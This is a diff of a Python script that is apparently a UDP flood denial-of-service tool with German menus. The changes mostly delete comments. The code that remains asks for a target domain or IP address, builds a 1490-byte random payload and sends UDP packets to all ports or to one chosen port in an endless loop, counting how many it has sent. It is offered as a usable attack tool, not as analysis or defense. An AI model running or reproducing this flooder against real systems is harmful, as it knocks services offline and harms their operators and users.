@@ -6,27 +6,21 @@ import socket
 from platform import system
 from tqdm.auto import tqdm
 
-# Plattform-Info
 uname = system()
 cmd_clear = 'cls' if uname == "Windows" else 'clear'
 os.system(cmd_clear)
 
-# Socket
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 
-# RDDoS_Tool
 while True:
-    # Benutzeroberfläche.
     print("")
     print("\033[92;1m")
     print("1. Website-Domain\n2. IP-Adresse\n3. Beenden")
     print('\033[0m')
 
-    # Eingabe.
     opt = str(input("\n> "))
 
-    # Auswahl.
     if opt == '1':
         domain = str(input("Domain: "))
         ip = socket.gethostbyname(domain)
@@ -44,8 +38,7 @@ while True:
         time.sleep(2)
         os.system(cmd_clear)
 
-# Portauswahl.
-port_mode = False  # Wenn 'False', werden alle Ports verwendet, wenn 'True' - ein bestimmter Port.
+port_mode = False 
 port = 2
 
 while 1:
@@ -61,9 +54,7 @@ while 1:
 
     else:
         print('\033[91mUngültige Auswahl!\033[0m')
-        time.sleep(2)
 
-# Arbeit starten.
 os.system(cmd_clear)
 print('\033[36;2mINITIALISIEREN....')
 time.sleep(1)
@@ -72,7 +63,7 @@ time.sleep(4)
 
 sent = 0
 
-if not port_mode:  # Alle Ports.
+if not port_mode: 
     try:
         while True:
             if port == 65534:
@@ -88,7 +79,7 @@ if not port_mode:  # Alle Ports.
     except Exception:
         print('\n\033[31;1mBeendet\033[0m')
 
-else:  # Bestimmter Port.
+else:  
     if port < 2:
         port = 2
 
